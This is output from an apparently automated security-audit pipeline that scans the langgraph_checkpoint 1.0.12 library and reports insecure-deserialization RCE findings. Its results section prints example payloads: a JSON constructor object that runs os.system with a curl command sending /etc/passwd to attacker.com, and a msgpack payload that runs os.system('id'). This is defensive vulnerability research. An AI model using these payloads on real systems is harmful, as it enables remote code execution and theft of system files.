agies — auditing /tmp/langgraph_checkpoint_old/langgraph_checkpoint-1.0.12

  Languages: Python
  Files: 12


Phase A: Path Discovery
  Backend: tree-sitter
  Functions: 66
    Remote Code Execution: 1 sink(s)
    ReDoS (Regular Expression DoS): 1 sink(s)
    Suspicious — requires analysis (path constructor / logic pattern): 2 sink(s)

Phase B: Slice Sorting (4 raw paths)
  Body-detected orphans: 3 (no call chain)
  Exploit: 4 + Explore: 0
  Project type: lib

Phase C: README Understanding
  (skipped — library mode)

Phase D: Library Analysis (4 slices)
  [1/4] rce-000 (loads_typed)
  [2/4] redos-001 (_default)
  [3/4] suspicious-002 (_reviver)
  [4/4] suspicious-003 (_msgpack_ext_hook)
    ✓ 0/10 — safe
    path bridge: 1 builder + 1 consumer
    Adversary: redos-001...
    ⚠ 10/10 — 1 contradiction(s)
    Adversary: suspicious-003...
    ⚠ 10/10 — 1 contradiction(s)
    Adversary: suspicious-002...
    x rebutted
      reason: The finding claims a ReDoS vulnerability, but the sink function 
`_default` does not compile or execute any regex pattern. It only serializes an 
existing `re.Pattern` object by calling `re.compile` with the pattern and flags.
The attacker cannot control the pattern because the input to `_default` is an 
object that is already a `re.Pattern` instance, which must have been created 
earlier in the code. There is no evidence that attacker-controlled strings are 
used to create regex patterns. Additionally, the data flow annotation indicates 
no identifiable parameters and untrusted input cannot reach this code path. The 
`[REACHABILITY: BODY_ONLY]` header further warns that the dangerous API is only 
present in the body without a project-internal call chain, making exploitation 
unrealistic.
    Evidence: redos-001...
    not rebutted
      weak point: The code directly uses attacker-controlled data from msgpack 
to dynamically import modules and call arbitrary functions/constructors without 
any validation. The try-except blocks suppress errors, making exploitation 
stealthy. This is a classic deserialization RCE vulnerability.
    PoC Agent: suspicious-003...
    not rebutted
      weak point: The finding is hard to disprove because the _reviver function 
directly uses attacker-controlled 'id' to import arbitrary modules and call 
arbitrary callables with attacker-controlled arguments, with no input validation
or whitelist. The simulated web endpoint makes it reachable from external input.
This is a classic insecure deserialization leading to RCE.
    PoC Agent: suspicious-002...
    ? pattern matched (1 match(es))
    ⚠ 9/10 — 1 contradiction(s)
    Adversary: rce-000...
    not rebutted
      weak point: The sink function `loads_typed` uses `msgpack.unpackb` with a 
custom `ext_hook`, which is a known vector for arbitrary code execution. The 
data originates from storage populated by user-controlled input, and there is no
validation or sanitization before deserialization. The developer intent does not
address deserialization risks, and the data flow trace shows untrusted input 
reaches the sink.
    PoC Agent: rce-000...
    PoC: 
/home/xcy/workSpace/code-agies/pocs/langgraph_checkpoint-1.0.12/rce__msgpack_ext
_hook.py
    Evidence: suspicious-003...
    No code-level evidence patterns.
    PoC: 
/home/xcy/workSpace/code-agies/pocs/langgraph_checkpoint-1.0.12/rce_vulnerabilit
y__reviver.py
    Evidence: suspicious-002...
    No code-level evidence patterns.
    PoC: 
/home/xcy/workSpace/code-agies/pocs/langgraph_checkpoint-1.0.12/rce_sink_functio
n_loads_typed_loads_typed_2.py
    Evidence: rce-000...
    evidence found (6 match(es))
      PoC: An attacker sends a POST request to /api/v1/trigger with a payload 
that causes the library to store a malicious msgpack blob. When `list` or 
`get_tupl...

Phase E: Results
  Blackboard: 3 cached intents, 12 knowledge entries, 4 phase results
  High confidence (3):
    rce-000: msgpack.unpackb — logic_gap
      An attacker sends a POST request to /api/v1/trigger with a payload that 
causes the library to store a malicious msgpack blob. When `list` or `get_tuple`
is called, the blob is deserialized via `msgpack.unpackb` with `ext_hook`, 
triggering RCE. Example payload: a crafted msgpack object that uses the ext_hook
to instantiate a dangerous class like `subprocess.Popen`.
    suspicious-002: _reviver — logic_gap
      An attacker sends a JSON payload like: {"lc": 2, "type": "constructor", 
"id": ["os", "system"], "args": ["curl http://attacker.com/$(cat 
/etc/passwd)"]}. This will execute os.system with the attacker's command.
    suspicious-003: _msgpack_ext_hook — logic_gap
      An attacker can craft a msgpack payload with EXT_CONSTRUCTOR_SINGLE_ARG 
code, setting module='os', name='system', arg='id'. When unpacked, it executes 
os.system('id').

Pipeline Complete
  Target: /tmp/langgraph_checkpoint_old/langgraph_checkpoint-1.0.12
  Model: deepseek-chat
  Duration: 43.7s
  Paths discovered: 4
  Slices analyzed: 4
  Findings: 3 high, 1 interesting
  Tokens: 50,044 total (41,300 prompt + 8,744 completion)

  Recommended verification targets:
    RCE rce-000: The data flow starts from the simulated web endpoint where 
user-controlled input is passed to the `l
    SUSPICIOUS suspicious-002: The _reviver function deserializes JSON objects 
with 'lc' field set to 2 and 'type' set to 'construc
    SUSPICIOUS suspicious-003: The function _msgpack_ext_hook deserializes 
msgpack data and dynamically imports modules and calls a

v3 CodeQL pipeline complete.
